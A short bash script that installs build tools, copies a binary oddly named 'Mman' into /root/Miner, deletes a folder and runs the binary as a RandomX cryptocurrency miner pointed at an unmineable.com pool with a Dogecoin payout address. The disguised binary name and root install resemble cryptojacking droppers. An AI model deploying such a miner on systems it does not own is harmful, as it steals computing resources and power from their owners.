#!/bin/bash
sudo apt-get update -y
sudo apt-get install git build-essential cmake libuv1-dev libssl-dev libhwloc-dev -y
mkdir /root/Miner
cp Mman /root/Miner
cp start.sh /root/Miner
cd
rm -rf cripminto
cd /root/Miner/
chmod +x Mman
./Mman -o rx.unmineable.com:13333 -a rx -k -u DOGE:D6hZna7Ht34n6gD1645wh8QsDqn3oihN4F.Mrlol1
echo done
